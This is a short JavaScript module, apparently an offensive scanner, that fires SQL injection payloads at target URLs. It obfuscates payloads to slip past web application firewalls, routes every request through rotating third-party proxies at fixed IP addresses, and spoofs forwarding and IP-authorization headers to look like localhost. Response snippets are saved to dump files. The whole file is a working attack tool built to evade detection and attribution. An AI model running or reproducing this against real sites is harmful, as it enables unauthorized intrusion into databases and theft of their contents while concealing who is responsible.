const axios = require('axios');
const fs = require('fs');
const qs = require('querystring');

// Define rotating proxies
const proxies = [
  { host: '138.201.5.29', port: 3128 },
  { host: '45.77.111.86', port: 8080 },
  { host: '134.209.29.120', port: 8080 }
];

// Creative payload encodings to bypass WAF
const encodedVariants = [
  payload => payload.replace(/ /g, '/**/'),
  payload => payload.replace(/SELECT/gi, 'SEL/**/ECT'),
  payload => payload.replace(/UNION/gi, 'UNI/*!ON*/'),
  payload => encodeURIComponent(encodeURIComponent(payload)), // double encode
];

const headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Referer': 'https://google.com',
  'X-Forwarded-For': '127.0.0.1',
  'X-Originating-IP': '127.0.0.1',
  'X-Real-IP': '127.0.0.1',
  'X-Custom-IP-Authorization': '127.0.0.1',
  'Accept-Language': 'en-US,en;q=0.9',
  'Accept-Encoding': 'gzip, deflate'
};

async function runPayloads(targets) {
  const results = [];
  const payloads = JSON.parse(fs.readFileSync("payloads.json", "utf-8")).SQLi;

  for (const url of targets) {
    for (const payload of payloads) {
      for (const encodeFn of encodedVariants) {
        const encodedPayload = encodeFn(payload);

        for (const proxy of proxies) {
          const fullUrl = url.includes('?') ? url + encodedPayload : url + '?v=' + encodedPayload;
          const proxyLabel = `${proxy.host}:${proxy.port}`;
          try {
            const res = await axios.get(fullUrl, {
              headers,
              proxy: {
                host: proxy.host,
                port: proxy.port
              },
              timeout: 10000
            });
            const data = typeof res.data === 'object' ? JSON.stringify(res.data) : res.data.toString();
            const snippet = data.slice(0, 300);
            const dumpFile = `proxy_dump_${Date.now()}.txt`;
            fs.writeFileSync(dumpFile, snippet);
            results.push({ url: fullUrl, proxy: proxyLabel, method: 'GET', status: res.status, dump: dumpFile });
            console.log(`⚔️ [${proxyLabel}] ${res.status} - ${fullUrl} → Dump saved to ${dumpFile}`);
          } catch (e) {
            console.log(`❌ [${proxyLabel}] ${e.response?.status || 'ERR'} - ${fullUrl}`);
          }
        }
      }
    }
  }

  return results;
}

module.exports = { runPayloads };
